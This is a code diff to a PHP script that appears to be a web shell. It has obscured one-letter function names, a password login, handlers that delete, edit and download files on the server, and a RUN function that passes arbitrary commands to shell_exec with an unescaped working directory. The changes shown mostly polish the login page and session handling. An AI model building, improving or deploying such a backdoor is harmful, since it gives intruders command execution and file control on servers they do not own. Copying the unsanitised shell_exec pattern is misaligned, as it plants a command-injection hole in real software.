@@ -44,7 +44,8 @@ function C($n){ return X($_POST[$n]) ? $_POST[$n] : 0; }
 function D($n){ return X($_GET[$n]) ? $_GET[$n] : 0; }
 function E($t,$n,$v="",$s=""){ return in_array($t,["text","password","submit","file"]) ? "<input type='$t' name='$n' value='$v' style='$s'/>" : "<$t name='$n' style='$s'>$v</$t>"; }
 function F($m,$i,$x=""){
-    $f="<form method='$m' enctype='$x'>";
+    $enc = $x ? " enctype='$x'" : "";
+    $f="<form method='$m'$enc>";
     $f.=csrf_token_field();
     foreach($i as $k=>$v){
         if(is_array($v)){
@@ -61,7 +62,7 @@ function I(){
     if(A("login")) return 1;
     if(!C("login")) return 0;
     if(!hash_equals(PASSWORD_HASH, hash('sha256', (string)C("pass")))) return 0;
-    session_regenerate_id(true);
+    if(session_status() === PHP_SESSION_ACTIVE) @session_regenerate_id(true);
     B("login",1);
     return 1;
 }
@@ -140,7 +141,10 @@ function ZIP($fullPath){ if(!class_exists('ZipArchive')) return false;
     exit();
 }
 function RUN($cmd, $cwd = null, $timeout = 15){ if($cmd === "" || $cmd === null) { return ["out"=>"", "err"=>"empty command", "code"=>-1, "time"=>0]; } $cwd = $cwd ? $cwd : J(); $output = shell_exec("cd $cwd && $cmd 2>&1"); $exitCode = 0; preg_match('/^.*\n([0-9]+)$/', $output, $matches); if($matches) $exitCode = (int)$matches[1]; return ["out"=>trim($output), "err"=>"", "code"=>$exitCode, "time"=>0]; }
-if(!I()){ Y(F("POST", ["password"=>["pass",""], "submit"=>["login","Login"]])); }
+if(!I()){
+    $err = C("login") ? "<p style='color:red'>Invalid password</p>" : "";
+    Y("<!DOCTYPE html><html><body style='font-family:monospace'><h3>Login</h3>".$err.F("POST", ["password"=>["pass",""], "submit"=>["login","Login"]])."</body></html>");
+}
 if(D("delete")){ $delPath = sanitize_path(D("delete")); $fullPath = J() . "/" . $delPath; if(is_file($fullPath) || is_link($fullPath)){ unlink($fullPath); Y("Silindi: ".$delPath); } elseif(is_dir($fullPath)){ rmdir($fullPath); Y("Dizin silindi: ".$delPath); } else Y("Yol bulunamadı: ".$delPath); }
 if(D("edit")){ $editPath = sanitize_path(D("edit")); $fullPath = J() . "/" . $editPath; if(C("save")){ if(P($fullPath, C("edit"))) Y("Kaydedildi: ".$editPath); else Y("Kaydetme hatası: dosya/yol izinleri"); } $e=O($fullPath); $e ? Y($e) : Y("Dosya bulunamadı: ".$editPath); }
 if(D("download")){ $dlPath = sanitize_path(D("download")); $fullPath = J() . "/" . $dlPath; if(is_file($fullPath)){ M($fullPath); exit(); } Y("File not found"); }
